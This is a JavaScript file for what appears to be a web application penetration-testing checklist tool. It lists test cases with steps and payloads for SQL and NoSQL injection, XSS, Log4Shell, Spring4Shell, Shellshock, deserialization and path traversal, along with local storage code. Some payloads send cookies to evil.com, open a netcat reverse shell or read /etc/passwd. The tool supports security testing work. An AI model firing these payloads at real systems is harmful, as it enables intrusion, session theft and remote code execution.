        payloads: [
            "/api/products?category=1' OR 1=1--",
            "/api/items?limit=10 UNION SELECT null, table_name FROM information_schema.tables--"
        ],
        expected: "Data extraction via product catalog filter SQL injection."
    },
    {
        id: "xss_dom_innerhtml_sink",
        category: "XSS",
        title: "DOM-Based XSS via innerHTML Sink [Client-Side JS]",
        where: "Client-Side Script Sink",
        severity: "High",
        steps: [
            "Inspect client-side JavaScript source code for assignment of URL hash or query parameters to `element.innerHTML`."
        ],
        payloads: [
            "/#&lt;img src=x onerror=alert(document.domain)&gt;",
            "/#&lt;script&gt;alert(1)&lt;/script&gt;"
        ],
        expected: "Executing JavaScript in the browser via insecure innerHTML DOM manipulation."
    },
    {
        id: "xss_stored_user_bio",
        category: "XSS",
        title: "Stored Cross-Site Scripting in User Biography [Profile Settings]",
        where: "User Profile Bio Field",
        severity: "Critical",
        steps: [
            "Log into your account and edit your profile biography field."
        ],
        payloads: [
            "&lt;script&gt;fetch('https://evil.com/steal?cookie='+document.cookie)&lt;/script&gt;",
            "&lt;svg/onload=alert(document.domain)&gt;"
        ],
        expected: "Automatic execution of malicious scripts when viewing user profile pages."
    },
    {
        id: "xss_reflected_error_message",
        category: "XSS",
        title: "Reflected Cross-Site Scripting in Error Page [Error Notification]",
        where: "Error Response Page",
        severity: "Medium",
        steps: [
            "Trigger application error pages by passing invalid parameters in the URL."
        ],
        payloads: [
            "/error?msg=&lt;script&gt;alert(1)&lt;/script&gt;",
            "/not-found?path=&lt;img src=x onerror=alert(document.domain)&gt;"
        ],
        expected: "Reflected script execution in custom error message response pages."
    },
    {
        id: "xss_dom_document_write",
        category: "XSS",
        title: "DOM-Based XSS via document.write Sink [Client JavaScript]",
        where: "Client-Side Script Sink",
        severity: "High",
        steps: [
            "Inspect JavaScript source files for insecure usage of `document.write()` sourcing data from query strings."
        ],
        payloads: [
            "/?name=&lt;script&gt;alert(document.domain)&lt;/script&gt;",
            "/?message=&lt;svg onload=alert(1)&gt;"
        ],
        expected: "Script execution via document.write DOM manipulation."
    },
    {
        id: "xss_stored_group_chat",
        category: "XSS",
        title: "Stored XSS in Group Chat Messaging [Live Chat Application]",
        where: "Live Chat Message Input",
        severity: "Critical",
        steps: [
            "Send a chat message containing an HTML/JavaScript payload into a group chat room."
        ],
        payloads: [
            "&lt;script&gt;alert(document.domain)&lt;/script&gt;",
            "&lt;img src=x onerror=alert(1)&gt;"
        ],
        expected: "Executing scripts automatically in all users' browsers upon receiving chat messages."
    },
    {
        id: "xss_reflected_header_user_agent",
        category: "XSS",
        title: "Reflected XSS via User-Agent Header in Admin Dashboard [Admin Logs]",
        where: "Admin Log Dashboard",
        severity: "High",
        steps: [
            "Capture a web request in Burp Suite and modify the `User-Agent` header to contain a script payload."
        ],
        payloads: [
            "User-Agent: &lt;script&gt;alert(document.cookie)&lt;/script&gt;",
            "User-Agent: &lt;img src=x onerror=alert(1)&gt;"
        ],
        expected: "Stored or reflected script execution inside the administrator log monitoring panel."
    },
    {
        id: "xss_stored_product_review",
        category: "XSS",
        title: "Stored Cross-Site Scripting in E-Commerce Product Review [Review Form]",
        where: "Product Review Submission",
        severity: "Critical",
        steps: [
            "Submit a product review containing an HTML/JavaScript payload in the review text or title."
        ],
        payloads: [
            "&lt;script&gt;alert(document.domain)&lt;/script&gt;",
            "&lt;svg onload=alert(document.cookie)&gt;"
        ],
        expected: "Executing arbitrary scripts in customers' browsers when viewing product reviews."
    },
    {
        id: "xss_dom_eval_sink",
        category: "XSS",
        title: "DOM-Based XSS via eval() Sink [JavaScript Execution Sink]",
        where: "Client JavaScript eval()",
        severity: "Critical",
        steps: [
            "Identify client-side JavaScript functions passing user-controlled parameters into `eval()` or `setTimeout()`."
        ],
        payloads: [
            "/?expression=alert(document.domain)",
            "/?callback=eval(window.name)"
        ],
        expected: "Arbitrary JavaScript code execution via insecure eval() sinks."
    },
    {
        id: "xss_reflected_pagination_parameter",
        category: "XSS",
        title: "Reflected XSS in Pagination Page Number Parameter [Listings Page]",
        where: "Pagination Query Parameter",
        severity: "Medium",
        steps: [
            "Capture the listings page request containing pagination parameters (e.g., ?page=1)."
        ],
        payloads: [
            "/listings?page=&lt;script&gt;alert(1)&lt;/script&gt;",
            "/products?p=&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;"
        ],
        expected: "Reflected cross-site scripting via pagination parameters."
    },
    {
        id: "xss_stored_shipping_address",
        category: "XSS",
        title: "Stored XSS in Shipping Address Form [Checkout Address Fields]",
        where: "Shipping Address Fields",
        severity: "High",
        steps: [
            "Enter script payloads into address line or city fields during checkout and save."
        ],
        payloads: [
            "&lt;script&gt;alert(document.cookie)&lt;/script&gt;",
            "&lt;img src=x onerror=alert(1)&gt;"
        ],
        expected: "Executing scripts in the admin panel when reviewing customer shipping addresses."
    },
    {
        id: "rce_cve_log4shell_jndi",
        category: "RCE & Injection",
        title: "Log4Shell (CVE-2021-44228) Remote Code Execution [User-Agent / Headers]",
        where: "HTTP Header Inputs",
        severity: "Critical",
        steps: [
            "Capture HTTP requests in Burp Suite and inject JNDI lookup strings into headers like `User-Agent`, `X-Forwarded-For`, or Cookie parameters.",
            "Point the JNDI lookup to an external attacker-controlled LDAP or RMI server.",
            "Monitor your external listener for incoming connections and callbacks confirming RCE."
        ],
        payloads: [
            "${jndi:ldap://evil.com/a}",
            "${jndi:rmi://evil.com/a}"
        ],
        expected: "Remote code execution on the Java application server via Log4j JNDI lookups."
    },
    {
        id: "rce_spring4shell_parameter",
        category: "RCE & Injection",
        title: "Spring4Shell Remote Code Execution (CVE-2022-22965) [API Parameters]",
        where: "Spring MVC Parameters",
        severity: "Critical",
        steps: [
            "Identify Spring Framework endpoints running on vulnerable JDK versions."
        ],
        payloads: [
            "class.module.classLoader.resources.context.parent.pipeline.first.pattern=...",
            "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
        ],
        expected: "Deploying a web shell onto the Spring Boot server via classloader manipulation."
    },
    {
        id: "rce_cve_text4shell_injection",
        category: "RCE & Injection",
        title: "Text4Shell Remote Code Execution (CVE-2022-42889) [Apache Commons Text]",
        where: "String Interpolation Fields",
        severity: "Critical",
        steps: [
            "Locate application inputs processed by Apache Commons Text string interpolation."
        ],
        payloads: [
            "${script:javascript:java.lang.Runtime.getRuntime().exec('id')}",
            "${url:dns:http://evil.com}"
        ],
        expected: "Arbitrary code execution or DNS exfiltration via Apache Commons Text interpolation."
    },
    {
        id: "rce_python_pickle_deserialization",
        category: "RCE & Injection",
        title: "Python Pickle Deserialization Remote Code Execution [Cookie / API Payload]",
        where: "Python Pickle Cookie Data",
        severity: "Critical",
        steps: [
            "Identify endpoints or cookies processing Python pickled data (starting with `gASV` or similar magic bytes)."
        ],
        payloads: [
            "cos\nsystem\n(S'id'\ntR.",
            "Python Pickle payload executing os.system('nc evil.com 4444 -e /bin/sh')"
        ],
        expected: "Arbitrary operating system command execution via Python pickle deserialization."
    },
    {
        id: "rce_el_expression_injection",
        category: "RCE & Injection",
        title: "Expression Language (EL) Injection Remote Code Execution [Template Input]",
        where: "EL Evaluation Fields",
        severity: "Critical",
        steps: [
            "Identify input fields where user data is evaluated by Java Expression Language (EL) engines."
        ],
        payloads: [
            "${''.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')}",
            "#{T(java.lang.Runtime).getRuntime().exec('id')}"
        ],
        expected: "Remote code execution via Java Expression Language evaluation."
    },
    {
        id: "rce_php_assert_injection",
        category: "RCE & Injection",
        title: "PHP Code Injection via assert() [Dynamic Parameter Evaluation]",
        where: "PHP Parameter Input",
        severity: "Critical",
        steps: [
            "Locate PHP scripts passing user inputs directly into `assert()` or `eval()` functions."
        ],
        payloads: [
            "test'); system('id'); #",
            "1; phpinfo();"
        ],
        expected: "Executing arbitrary PHP code and system commands on the server."
    },
    {
        id: "rce_ruby_yaml_deserialization",
        category: "RCE & Injection",
        title: "Ruby YAML Deserialization Remote Code Execution [YAML Parser API]",
        where: "YAML Import Endpoint",
        severity: "Critical",
        steps: [
            "Identify endpoints parsing user-supplied YAML data using unsafe psych or YAML parsers."
        ],
        payloads: [
            "--- !ruby/object:Gem::Requirement\nrequirements: !ruby/object:Gem::Dependency\n  ...",
            "--- !ruby/hash:ActiveSupport::HashWithIndifferentAccess\n  key: !ruby/object:Net::BufferedIO ..."
        ],
        expected: "Remote code execution via unsafe Ruby YAML object instantiation."
    },
    {
        id: "rce_imagemagick_ghostscript_rce",
        category: "RCE & Injection",
        title: "ImageMagick Ghostscript Command Injection (ImageTragick) [Avatar Upload]",
        where: "Image Processing Upload",
        severity: "Critical",
        steps: [
            "Craft a malicious image file (e.g., SVG or MVG format) embedding Ghostscript command execution strings."
        ],
        payloads: [
            "push graphic-context\nviewbox 0 0 640 480\nimage over 0,0 0,0 'https://example.com/image.jpg\\&quot;|id\\&quot;'\npop graphic-context"
        ],
        expected: "Remote code execution on the server during image processing via ImageMagick."
    },
    {
        id: "rce_shellshock_bash_cgi",
        category: "RCE & Injection",
        title: "Shellshock Remote Code Execution (CVE-2014-6271) [CGI Scripts / User-Agent]",
        where: "CGI Script Endpoints",
        severity: "Critical",
        steps: [
            "Identify legacy CGI script endpoints on the web server."
        ],
        payloads: [
            "User-Agent: () { :;}; echo; /bin/id",
            "User-Agent: () { :;}; /bin/cat /etc/passwd"
        ],
        expected: "Executing arbitrary shell commands via bash environment variable parsing flaws."
    },
    {
        id: "rce_cve_spring_cloud_function",
        category: "RCE & Injection",
        title: "Spring Cloud Function SpEL RCE (CVE-2022-22963) [HTTP Header Routing]",
        where: "Spring Cloud Header Routing",
        severity: "Critical",
        steps: [
            "Identify Spring Cloud Function endpoints accepting routing headers."
        ],
        payloads: [
            "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\"id\")",
            "spring.cloud.function.routing-expression: T(java.lang.ProcessBuilder).start(\"/bin/id\")"
        ],
        expected: "Remote code execution via SpEL injection in Spring Cloud routing headers."
    },
    {
        id: "sqli_error_based_search",
        category: "SQLi",
        title: "Error-Based SQL Injection [Search Results]",
        where: "Search Results Page",
        severity: "High",
        steps: ["Submit a single quote in the search input.", "Compare the response for database error details.", "Confirm the behavior with a harmless boolean variation."],
        payloads: ["'", "' AND 1=1--", "' AND 1=2--"],
        expected: "Database errors or response differences reveal unsafe query handling."
    },
    {
        id: "xss_reflected_search_filter",
        category: "XSS",
        title: "Reflected XSS [Search Filter]",
        where: "Search Filter",
        severity: "High",
        steps: ["Place an encoded HTML test string in the search filter.", "Submit the filter and inspect the result page.", "Verify that the value is rendered as text rather than markup."],
        payloads: ["&lt;img src=x onerror=alert(1)&gt;", "\"&gt;&lt;svg onload=alert(1)&gt;"],
        expected: "The input is safely encoded and does not execute in the browser."
    },
    {
        id: "auth_session_fixation",
        category: "Auth & Session",
        title: "Session Fixation [Login Flow]",
        where: "Login Flow",
        severity: "High",
        steps: ["Record the session identifier before authentication.", "Authenticate successfully using the same browser session.", "Check whether the identifier changes after login."],
        payloads: ["Reuse pre-authentication session identifier"],
        expected: "A fresh session identifier is issued after authentication."
    },
    {
        id: "auth_logout_invalidation",
        category: "Auth & Session",
        title: "Session Not Invalidated After Logout [Logout Endpoint]",
        where: "Logout Endpoint",
        severity: "High",
        steps: ["Authenticate and capture the active session cookie.", "Log out from the application.", "Replay a harmless authenticated request with the old cookie."],
        payloads: ["Replay previous session cookie after logout"],
        expected: "The old session is rejected after logout."
    },
    {
        id: "idor_invoice_access",
        category: "IDOR & Access",
        title: "IDOR in Invoice Access [Invoice Endpoint]",
        where: "Invoice Endpoint",
        severity: "High",
        steps: ["Open an invoice belonging to the current account.", "Change only the invoice identifier.", "Verify authorization for the changed resource."],
        payloads: ["/invoices/1001 to /invoices/1002"],
        expected: "Invoices owned by other accounts remain inaccessible."
    },
    {
        id: "idor_delete_authorization",
        category: "IDOR & Access",
        title: "Unauthorized Resource Deletion [Delete API]",
        where: "Delete API",
        severity: "Critical",
        steps: ["Capture a delete request for an owned resource.", "Replace the resource identifier with another account's identifier.", "Check the authorization response."],
        payloads: ["DELETE /api/v1/files/2002"],
        expected: "The server denies deletion of resources outside the current account."
    },
    {
        id: "csrf_email_change",
        category: "CSRF",
        title: "CSRF on Email Change [Account Settings]",
        where: "Account Settings",
        severity: "High",
        steps: ["Identify the email update request.", "Submit it from a separate origin in a controlled test.", "Check token and origin validation."],
        payloads: ["Cross-origin POST without a valid CSRF token"],
        expected: "Email changes require valid anti-CSRF protections."
    },
    {
        id: "ssrf_dns_rebinding",
        category: "SSRF",
        title: "SSRF DNS Rebinding Protection [URL Preview]",
        where: "URL Preview",
        severity: "High",
        steps: ["Submit a controlled URL that resolves to a public address first.", "Observe whether the destination changes to a private address.", "Verify private-network protections are enforced after resolution."],
        payloads: ["Controlled DNS rebinding test domain"],
        expected: "Private and loopback destinations are blocked after DNS resolution."
    },
    {
        id: "file_upload_content_type",
        category: "File Upload",
        title: "File Upload Content-Type Bypass [Document Upload]",
        where: "Document Upload",
        severity: "High",
        steps: ["Upload a non-executable test file with an unexpected content type.", "Change the multipart content type while keeping the file unchanged.", "Verify server-side type validation."],
        payloads: ["Content-Type: image/jpeg for a non-image test file"],
        expected: "Validation uses file content and policy rather than a client-controlled MIME type."
    },
    {
        id: "path_traversal_download",
        category: "Path Traversal",
        title: "Path Traversal in File Download [Download API]",
        where: "Download API",
        severity: "High",
        steps: ["Request a permitted file through the download endpoint.", "Replace its name with a traversal sequence targeting a harmless known file.", "Confirm canonical path validation."],
        payloads: ["../../../../test-fixture.txt", "..%2f..%2ftest-fixture.txt"],
        expected: "Files outside the permitted directory cannot be downloaded."
    },
    {
        id: "business_logic_coupon_reuse",
        category: "Business Logic",
        title: "Coupon Reuse After Redemption [Coupon API]",
        where: "Coupon API",
        severity: "Medium",
        steps: ["Redeem a single-use coupon once.", "Repeat the redemption request.", "Compare balance and order totals."],
        payloads: ["coupon=single-use-test"],
        expected: "A redeemed single-use coupon cannot be applied again."
    },
    {
        id: "business_logic_currency_rounding",
        category: "Business Logic",
        title: "Currency Rounding Manipulation [Payment Form]",
        where: "Payment Form",
        severity: "Medium",
        steps: ["Create an order with fractional quantities or prices where supported.", "Compare client and server totals.", "Verify consistent server-side rounding rules."],
        payloads: ["amount=0.001", "quantity=0.1"],
        expected: "Server totals follow defined currency precision and cannot be reduced through rounding."
    },
    {
        id: "api_excessive_data_exposure",
        category: "API & GraphQL",
        title: "Excessive Data Exposure [User API]",
        where: "User API",
        severity: "Medium",
        steps: ["Request the current user's normal profile response.", "Inspect all returned fields for internal or sensitive values.", "Compare output with the documented response contract."],
        payloads: ["GET /api/v1/profile"],
        expected: "The API returns only fields required by the client."
    },
    {
        id: "api_mass_assignment_preferences",
        category: "API & GraphQL",
        title: "Mass Assignment in Preferences [Settings API]",
        where: "Settings API",
        severity: "High",
        steps: ["Capture a normal preferences update.", "Add an unrelated protected property to the JSON body.", "Verify the server ignores fields outside the update schema."],
        payloads: ["{\"theme\":\"light\",\"is_staff\":true}"],
        expected: "Protected properties cannot be changed through preferences updates."
    },
    {
        id: "information_disclosure_verbose_errors",
        category: "Information Disclosure",
        title: "Verbose Error Disclosure [Error Pages]",
        where: "Error Pages",
        severity: "Low",
        steps: ["Trigger a controlled validation error.", "Inspect the response body and headers.", "Check for stack traces, paths, versions, or secrets."],
        payloads: ["Malformed request to a documented endpoint"],
        expected: "Errors expose a generic message without sensitive implementation details."
    },
    {
        id: "security_headers_hsts",
        category: "Security Headers",
        title: "Missing Strict Transport Security [HTTPS Pages]",
        where: "HTTPS Pages",
        severity: "Medium",
        steps: ["Request a production HTTPS page.", "Inspect response headers.", "Verify an appropriate Strict-Transport-Security policy."],
        payloads: ["Strict-Transport-Security response header check"],
        expected: "HTTPS responses include an appropriate HSTS policy."
    },
    {
        id: "security_headers_csp",
        category: "Security Headers",
        title: "Content Security Policy Review [Application Pages]",
        where: "Application Pages",
        severity: "Medium",
        steps: ["Inspect the Content-Security-Policy response header.", "Review script, object, frame, and connect sources.", "Confirm the policy matches the application's trusted origins."],
        payloads: ["Content-Security-Policy header review"],
        expected: "A restrictive CSP reduces script injection and framing risk."
    },
    {
        id: "websocket_message_authorization",
        category: "WebSockets",
        title: "WebSocket Message Authorization [Realtime Channel]",
        where: "Realtime Channel",
        severity: "High",
        steps: ["Connect as a permitted user.", "Send a message referencing another user's resource.", "Verify authorization is checked for each message."],
        payloads: ["{\"action\":\"read\",\"resource_id\":\"other-user-resource\"}"],
        expected: "WebSocket messages cannot access resources outside the user's authorization scope."
    },
    {
        id: "oauth_pkce_missing",
        category: "Auth & Session",
        title: "Missing PKCE Protection [OAuth Authorization Code Flow]",
        where: "OAuth Authorization Code Flow",
        severity: "High",
        steps: ["Start the authorization code flow for a public client.", "Inspect the authorization request for a code challenge.", "Verify the token exchange requires the matching verifier."],
        payloads: ["Omission of code_challenge parameter"],
        expected: "Public-client authorization codes require PKCE verification."
    },
    {
        id: "admin_audit_log_tampering",
        category: "Admin & Monitoring",
        title: "Audit Log Tampering [Admin Audit Logs]",
        where: "Admin Audit Logs",
        severity: "High",
        steps: ["Create a normal auditable administrative event.", "Attempt to alter or delete its log entry as a low-privilege user.", "Verify log integrity and access controls."],
        payloads: ["DELETE /api/v1/audit/entries/1001"],
        expected: "Audit records are immutable or tightly controlled and remain traceable."
    },
    {
        id: "session_cookie_security_flags",
        category: "Auth & Session",
        title: "Missing Session Cookie Security Flags [Session Cookies]",
        where: "Session Cookies",
        severity: "Medium",
        steps: ["Authenticate with a disposable test account.", "Inspect session cookies in the browser or an authorized proxy.", "Verify Secure, HttpOnly, and an appropriate SameSite attribute are present."],
        payloads: ["Set-Cookie security attribute review"],
        expected: "Session cookies use Secure, HttpOnly, and an appropriate SameSite policy."
    },
    {
        id: "api_method_authorization",
        category: "IDOR & Access",
        title: "HTTP Method Authorization Bypass [REST API]",
        where: "REST API Endpoints",
        severity: "High",
        steps: ["Capture a request that is permitted for the test account.", "Repeat the request with another documented HTTP method against the same owned resource.", "Verify authorization is enforced consistently for every method."],
        payloads: ["OPTIONS /api/v1/resource/1001", "PUT or DELETE on an owned test resource"],
        expected: "Unsupported or unauthorized methods are rejected without changing protected data."
    },
    {
        id: "cache_control_private_data",
        category: "Information Disclosure",
        title: "Missing Cache Controls on Private Responses [Authenticated Pages]",
        where: "Authenticated Pages",
        severity: "Medium",
        steps: ["Open a private page using a disposable account.", "Inspect response Cache-Control and related headers.", "Verify private content is not stored in shared browser or intermediary caches."],
        payloads: ["Cache-Control header review", "Replay a harmless cached response after logout"],
        expected: "Private responses use appropriate no-store or private cache directives."
    },
    {
        id: "api_content_type_validation",
        category: "API & GraphQL",
        title: "Inconsistent API Content-Type Validation [JSON Endpoints]",
        where: "JSON API Endpoints",
        severity: "Medium",
        steps: ["Capture a normal JSON request for a disposable test record.", "Repeat it with an unsupported or mismatched Content-Type.", "Verify the server rejects malformed formats without processing unintended fields."],
        payloads: ["Content-Type: text/plain", "Content-Type: application/xml"],
        expected: "The API accepts only documented content types and safely rejects malformed bodies."
    },
    {
        id: "business_logic_checkout_step_replay",
        category: "Business Logic",
        title: "Checkout Step Replay and Order State Transition Bypass",
        where: "Multi-Step Checkout Flow",
        severity: "High",
        steps: [
            "Create a disposable test order and complete the checkout steps in the intended sequence.",
            "Replay a confirmation or payment-completion request before completing the required previous step.",
            "Compare the order state, payment state, and fulfillment state with the normal flow."
        ],
        payloads: [
            "Replay the final checkout request before payment authorization",
            "Repeat a completed checkout transition with the same order identifier"
        ],
        expected: "The server must enforce checkout state transitions and reject skipped, repeated, or out-of-order steps."
    },
    {
        id: "business_logic_coupon_scope_bypass",
        category: "Business Logic",
        title: "Coupon Scope, Expiry, and Eligibility Validation Bypass",
        where: "Coupon and Promotion API",
        severity: "Medium",
        steps: [
            "Create a disposable account and identify a test coupon with documented restrictions.",
            "Apply the coupon to an ineligible product, account, region, or expired campaign.",
            "Verify that the server, not only the client, enforces eligibility and expiry rules."
        ],
        payloads: [
            "coupon=expired-test-coupon",
            "coupon=restricted-category-coupon",
            "coupon=single-use-test-coupon"
        ],
        expected: "Coupons must be rejected when expired, out of scope, already used, or unavailable to the current account."
    },
    {
        id: "business_logic_refund_reversal_abuse",
        category: "Business Logic",
        title: "Refund and Payment Reversal State Abuse",
        where: "Orders, Refunds, and Payment API",
        severity: "High",
        steps: [
            "Use a disposable test order and request a valid refund through the normal flow.",
            "Repeat the refund request or attempt a refund after the order has already been reversed.",
            "Compare the refund amount, order state, and account balance after each request."
        ],
        payloads: [
            "POST /api/orders/test-order/refund",
            "Repeat the same refund request with the original transaction reference",
            "Refund amount greater than the captured payment amount"
        ],
        expected: "A transaction can be refunded only once and never for more than the captured amount."
    },
    {
        id: "business_logic_payment_method_swap",
        category: "Business Logic",
        title: "Payment Method Swap During Order Confirmation",
        where: "Payment and Order Confirmation Flow",
        severity: "High",
        steps: [
            "Create a disposable order and begin payment using a test payment method.",
            "Change the payment method or payment reference between authorization and confirmation.",
            "Verify that the confirmed order is bound to the authorized amount and payment transaction."
        ],
        payloads: [
            "payment_method_id=test-method-2",
            "payment_intent_id=another-test-intent",
            "amount=0.01"
        ],
        expected: "The server must bind the order to the authorized payment and reject mismatched payment references or amounts."
    },
    {
        id: "business_logic_inventory_reservation_bypass",
        category: "Business Logic",
        title: "Inventory Reservation and Quantity Limit Bypass",
        where: "Cart and Inventory API",
        severity: "High",
        steps: [
            "Add a limited-stock test item to a disposable account cart.",
            "Modify quantity, reservation, or stock reference values in the cart request.",
            "Verify that checkout cannot exceed available inventory or account purchase limits."
        ],
        payloads: [
            "quantity=0",
            "quantity=999999",
            "inventory_reservation_id=another-test-reservation"
        ],
        expected: "The server must enforce stock availability, minimum quantities, maximum quantities, and reservation ownership."
    },
    {
        id: "business_logic_subscription_plan_downgrade",
        category: "Business Logic",
        title: "Subscription Plan Upgrade and Downgrade Validation",
        where: "Subscription Management Flow",
        severity: "Medium",
        steps: [
            "Use a disposable subscription account with a known plan and billing period.",
            "Attempt to change plan, billing period, or entitlement values outside the documented flow.",
            "Verify billing, access duration, and feature entitlements remain consistent with the selected plan."
        ],
        payloads: [
            "plan_id=unavailable-test-plan",
            "billing_period=invalid-period",
            "entitlements=unrestricted"
        ],
        expected: "Only valid plans and billing transitions are accepted, and entitlements must match the paid subscription."
    },
    {
        id: "business_logic_invitation_reuse",
        category: "Business Logic",
        title: "Invitation Acceptance, Expiry, and Reuse Validation",
        where: "Team Invitation Flow",
        severity: "Medium",
        steps: [
            "Generate an invitation for a disposable test organization and recipient.",
            "Accept the invitation once, then retry the same token or use it with another account.",
            "Verify token ownership, expiry, membership, and role assignment."
        ],
        payloads: [
            "invite_token=single-use-test-token",
            "role=administrator",
            "organization_id=another-test-organization"
        ],
        expected: "Invitation tokens must be single-use, time-limited, bound to the intended organization, and unable to grant unauthorized roles."
    },
    {
        id: "business_logic_account_recovery_state",
        category: "Business Logic",
        title: "Account Recovery Token Lifecycle Validation",
        where: "Password Reset and Account Recovery Flow",
        severity: "High",
        steps: [
            "Request a recovery token for a disposable test account.",
            "Use the token once, then retry it, modify its associated account reference, or submit it after expiry.",
            "Verify that password reset and account recovery state changes are authorized and single-use."
        ],
        payloads: [
            "token=used-test-recovery-token",
            "user_id=another-test-user",
            "new_password=disposable-test-password"
        ],
        expected: "Recovery tokens must be single-use, time-limited, account-bound, and invalid after successful completion."
    },
    {
        id: "business_logic_loyalty_balance_transfer",
        category: "Business Logic",
        title: "Loyalty Points and Balance Transfer Validation",
        where: "Rewards and Wallet Transfer Flow",
        severity: "High",
        steps: [
            "Use disposable accounts with a small test rewards balance.",
            "Attempt to transfer more points than available, transfer to an unauthorized account, or repeat a completed transfer.",
            "Compare sender and recipient balances and transaction history."
        ],
        payloads: [
            "points=999999",
            "recipient_id=another-test-user",
            "transfer_id=completed-test-transfer"
        ],
        expected: "Transfers must be authorized, atomic, non-replayable, and limited to the available balance."
    },
    {
        id: "business_logic_shipping_address_binding",
        category: "Business Logic",
        title: "Shipping Address and Order Ownership Validation",
        where: "Checkout Address and Order API",
        severity: "Medium",
        steps: [
            "Create a disposable order with a test shipping address.",
            "Change the address identifier or account reference after order creation but before fulfillment.",
            "Verify that only authorized addresses belonging to the order owner can be selected."
        ],
        payloads: [
            "address_id=another-test-address",
            "user_id=another-test-user",
            "shipping_address_id=unowned-test-address"
        ],
        expected: "Orders must accept only authorized addresses owned by the current account and permitted for the order state."
    },
    {
        id: "dependency_version_disclosure",
        category: "Information Disclosure",
        title: "Dependency Version Disclosure [Public Assets and Headers]",
        where: "Public Assets and Response Headers",
        severity: "Low",
        steps: ["Review public response headers, error pages, and asset metadata.", "Record only version information exposed by the application.", "Verify unnecessary framework and dependency versions are not disclosed."],
        payloads: ["Server and X-Powered-By header review", "Public asset version string review"],
        expected: "Responses avoid exposing unnecessary implementation and dependency version details."
    },
    {
    id: "path_traversal_passwd_access",
    category: "Path Traversal",
    title: "Path Traversal via File or Resource Path",
    where: "File Download / Resource Endpoint",
    severity: "High",
    steps: [
        "Identify an authorized file download or resource endpoint.",
        "Modify the path parameter using traversal sequences and send a controlled test request.",
        "Review the response status, returned content, and canonical path validation behavior."
    ],
    payloads: [
        "../../../../../../etc/passwd",
        "/////////////../......////../../etc/passwd",
        "../;../../admin"
    ],
    expected: "The application must prevent access to files or resources outside the permitted directory."
},
{
    id: "nosql_auth_operator_injection",
    category: "NoSQL Injection",
    title: "NoSQL Operator Injection in Authentication Fields",
    where: "Login API / Authentication Endpoint",
    severity: "Critical",
    steps: [
        "Capture a login request using a disposable test account.",
        "Replace the email and password values with object-based NoSQL operator inputs.",
        "Check whether authentication is bypassed or the response behavior changes unexpectedly."
    ],
    payloads: [
                `{
    "email": {
        "$gt": ""
    },
    "password": {
        "$gt": ""
    }
}`,
                `{
    "email": "atickermel11@gmail.com",
    "password": {
        "$in": [null, true, ""]
    }
}`,
                `{
    "email": {
        "$where": "this.email.length > 0"
    },
    "password": {
        "$gt": ""
    }
}`
    ],
    expected: "Authentication must not succeed without valid credentials, and operator-based input must be rejected."
},
{
    id: "nosql_account_selection_mass_assignment",
    category: "NoSQL Injection",
    title: "NoSQL Operator Injection and Mass Assignment in Account Selection",
    where: "Login API / User Lookup Endpoint",
    severity: "Critical",
    steps: [
        "Capture an authorized login or user lookup request.",
        "Inject operator-based account selection values and unauthorized role properties.",
        "Verify that another account cannot be selected and privilege fields cannot be modified."
    ],
    payloads: [
                `{
    "email": {
        "$in": [
            "admin@example.com",
            "administrator@example.com",
            "test@example.com"
        ]
    },
    "password": {
        "$ne": null
    }
}`,
                `{
    "email": "test@gmail.com",
    "password": "Password123",
    "role": "admin",
    "isAdmin": true,
    "is_staff": 1
}`
    ],
    expected: "User-controlled input must not select unauthorized accounts, bypass authentication, or modify administrative privileges."
},

];
const testCases = allTestCases.filter(item => !['sqli_payload_collection_extended', 'xss_payload_collection_extended'].includes(item.id));
let activeCategory = null;
let currentLocationLabelMap = {};
let summaryCompletionFilter = null;
let summarySeverityFilter = null;
let currentPayloadCollection = 'xss';
const payloadStorageKey = 'thenawabx_custom_payloads';

function norm(s) {
    return (s || '').toString().trim().toLowerCase().replace(/\s+/g,' ');
}

function getSavedData() {
    try {
        const saved = localStorage.getItem('thenawabx_sec_ops_data');
        const data = saved ? JSON.parse(saved) : { status: {}, notes: {}, stepToReproduce: {}, findings: {}, workspace: {} };
        data.status = data.status || {};
        data.completed = data.completed || {};
        data.notes = data.notes || {};
        data.stepToReproduce = data.stepToReproduce || { ...data.notes };
        data.findings = data.findings || {};
        data.workspace = data.workspace || {};
        Object.values(data.findings).forEach(finding => {
            if (!finding.screenshots) finding.screenshots = finding.screenshot ? [finding.screenshot] : [];
            delete finding.screenshot;
        });
        Object.keys(data.status).forEach(id => {
            if (data.status[id] === true) data.status[id] = 'Fixed';
            if (data.status[id] === 'Retest Passed') data.status[id] = 'Fixed';
            if (!['Vulnerable', 'Fixed'].includes(data.status[id])) delete data.status[id];
            if (data.completed[id] === undefined) data.completed[id] = true;
        });
        return data;
    } catch (e) {
        return { status: {}, completed: {}, notes: {}, stepToReproduce: {}, findings: {}, workspace: {} };
    }
}
function saveData(data) {
    try { localStorage.setItem('thenawabx_sec_ops_data', JSON.stringify(data)); }
    catch (e) { console.error("Storage error:", e); }
}

let projectDirectoryHandle = null;

function projectFolderName() {
    const target = document.getElementById('targetInput').value.trim() || 'unnamed-target';
    return target.replace(/[<>:"/\\|?*]+/g, '-').replace(/\s+/g, ' ').replace(/^\.+|\.+$/g, '').slice(0, 80) || 'unnamed-target';
}

async function saveProjectToFolder() {
    if (!window.showDirectoryPicker) {
        alert('Folder saving requires a Chromium-based browser.');
        return;
    }
    try {
        projectDirectoryHandle = projectDirectoryHandle || await window.showDirectoryPicker({ mode: 'readwrite' });
        const projectFolder = await projectDirectoryHandle.getDirectoryHandle(projectFolderName(), { create: true });
        const fileHandle = await projectFolder.getFileHandle('progress.json', { create: true });
        const writable = await fileHandle.createWritable();
        await writable.write(JSON.stringify(getSavedData(), null, 2));
        await writable.close();
        alert(`Progress saved in ${projectFolderName()}/progress.json`);
    } catch (error) {
        if (error.name !== 'AbortError') alert('Could not save the project folder.');
    }
}

function getCaseStatus(data, id) {
    return data.status[id] || '';
}

function isCompletedStatus(data, id) {
    return data.completed[id] === true;
}

function getStepToReproduce(data, id) {
    return data.stepToReproduce[id] || data.notes[id] || '';
}

function saveWorkspace() {
    const data = getSavedData();
    data.workspace = {
        target: document.getElementById('targetInput').value,
        project: document.getElementById('projectInput').value,
        notes: document.getElementById('projectNotes').value
    };
    saveData(data);
}

function loadWorkspace() {
    const workspace = getSavedData().workspace || {};
    document.getElementById('targetInput').value = workspace.target || '';
